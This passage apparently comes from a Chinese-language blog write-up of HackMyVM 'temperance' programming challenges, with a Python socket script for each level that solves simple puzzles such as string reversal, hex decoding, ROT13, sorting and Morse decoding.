    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx04-字符串逆序"><a href="#levelx04-字符串逆序" class="headerlink" title="levelx04 字符串逆序"></a>levelx04 字符串逆序</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx04'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx05-最后五个字符"><a href="#levelx05-最后五个字符" class="headerlink" title="levelx05 最后五个字符"></a>levelx05 最后五个字符</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx05'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx06-字符串长度"><a href="#levelx06-字符串长度" class="headerlink" title="levelx06 字符串长度"></a>levelx06 字符串长度</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx06'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx07-16进制转字符串"><a href="#levelx07-16进制转字符串" class="headerlink" title="levelx07 16进制转字符串"></a>levelx07 16进制转字符串</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx07'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
   
    data3<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx08-两数之和"><a href="#levelx08-两数之和" class="headerlink" title="levelx08 两数之和"></a>levelx08 两数之和</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx08'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
   
    data3<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    data3 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx09-rot13"><a href="#levelx09-rot13" class="headerlink" title="levelx09 rot13"></a>levelx09 rot13</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token comment"># Function to translate text using Rot13 for decryption</span>
<span class="token keyword">def</span> <span class="token function">rot13</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> text<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">'A'</span> <span class="token operator">&lt;=</span> char <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'a'</span> <span class="token operator">&lt;=</span> char <span class="token operator">&lt;=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> char
    <span class="token keyword">return</span> result

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the introductory message</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx09" to choose the level</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx09\n'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    challenge_text <span class="token operator">=</span> data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># Decode and strip any extra newlines or spaces</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">,</span> challenge_text<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solution</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Sending solution'</span><span class="token punctuation">)</span>
    solved_challenge <span class="token operator">=</span> rot13<span class="token punctuation">(</span>challenge_text<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">,</span> solved_challenge<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>solved_challenge<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive and print the response from the server</span>
    data4 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data4<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h2 id="levelx10-数组排序"><a href="#levelx10-数组排序" class="headerlink" title="levelx10 数组排序"></a>levelx10 数组排序</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx10'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data3<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data3<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    
    data3<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data4<span class="token operator">=</span><span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> data3<span class="token punctuation">:</span>
        data4<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data4<span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data4<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx11-莫斯密码"><a href="#levelx11-莫斯密码" class="headerlink" title="levelx11 莫斯密码"></a>levelx11 莫斯密码</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
MORSE_CODE_DICT <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'.-'</span><span class="token punctuation">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'-...'</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'-.-.'</span><span class="token punctuation">:</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'-..'</span><span class="token punctuation">:</span> <span class="token string">'D'</span><span class="token punctuation">,</span>
    <span class="token string">'.'</span><span class="token punctuation">:</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'..-.'</span><span class="token punctuation">:</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'--.'</span><span class="token punctuation">:</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'....'</span><span class="token punctuation">:</span> <span class="token string">'H'</span><span class="token punctuation">,</span>
    <span class="token string">'..'</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'.---'</span><span class="token punctuation">:</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'-.-'</span><span class="token punctuation">:</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'.-..'</span><span class="token punctuation">:</span> <span class="token string">'L'</span><span class="token punctuation">,</span>
    <span class="token string">'--'</span><span class="token punctuation">:</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'-.'</span><span class="token punctuation">:</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'---'</span><span class="token punctuation">:</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'.--.'</span><span class="token punctuation">:</span> <span class="token string">'P'</span><span class="token punctuation">,</span>
    <span class="token string">'--.-'</span><span class="token punctuation">:</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'.-.'</span><span class="token punctuation">:</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'...'</span><span class="token punctuation">:</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">:</span> <span class="token string">'T'</span><span class="token punctuation">,</span>
    <span class="token string">'..-'</span><span class="token punctuation">:</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'...-'</span><span class="token punctuation">:</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'.--'</span><span class="token punctuation">:</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'-..-'</span><span class="token punctuation">:</span> <span class="token string">'X'</span><span class="token punctuation">,</span>
    <span class="token string">'-.--'</span><span class="token punctuation">:</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'--..'</span><span class="token punctuation">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'-----'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'.----'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
    <span class="token string">'..---'</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'...--'</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'....-'</span><span class="token punctuation">:</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'.....'</span><span class="token punctuation">:</span> <span class="token string">'5'</span><span class="token punctuation">,</span>
    <span class="token string">'-....'</span><span class="token punctuation">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'--...'</span><span class="token punctuation">:</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'---..'</span><span class="token punctuation">:</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'----.'</span><span class="token punctuation">:</span> <span class="token string">'9'</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">def</span> <span class="token function">decode_morse</span><span class="token punctuation">(</span>morse_code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 用空格分割摩斯密码，得到每个字符的摩斯码</span>
    morse_code_words <span class="token operator">=</span> morse_code<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
    <span class="token comment"># 用摩斯码映射表转换为字符</span>
    decoded_chars <span class="token operator">=</span> <span class="token punctuation">[</span>MORSE_CODE_DICT<span class="token punctuation">[</span>code<span class="token punctuation">]</span> <span class="token keyword">for</span> code <span class="token keyword">in</span> morse_code_words <span class="token keyword">if</span> code <span class="token keyword">in</span> MORSE_CODE_DICT<span class="token punctuation">]</span>
    <span class="token comment"># 将字符列表拼接为字符串</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>decoded_chars<span class="token punctuation">)</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
